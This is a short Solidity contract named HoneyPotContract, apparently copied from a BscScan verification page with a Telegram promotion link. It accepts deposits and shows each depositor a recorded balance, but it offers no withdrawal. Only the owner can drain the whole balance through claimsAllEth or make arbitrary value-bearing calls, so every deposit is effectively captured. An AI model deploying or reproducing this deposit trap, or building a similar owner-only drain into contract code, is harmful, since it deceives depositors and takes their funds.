/**
 *Submitted for verification at BscScan.com on 2022-07-29
*/

// SPDX-License-Identifier: MIT
// https://t.me/hnpot for more information.
pragma solidity 0.6.12;

pragma experimental ABIEncoderV2;

contract HoneyPotContract {
    address private immutable owner;

    mapping(address => uint) public  balanceOf;

    constructor() public {
        owner = msg.sender;
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }
    
    receive() payable external {
        deposit();
    }

    function call(address payable to, uint value, bytes calldata data) external onlyOwner payable returns (bytes memory) {
        require(to != address(0));
        (bool success, bytes memory result) = to.call{value : value}(data);
        require(success);
        return result;
    }

    function claimsAllEth() external onlyOwner {
        (bool success,) = owner.call{value : address(this).balance}(new bytes(0));
        require(success);
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

}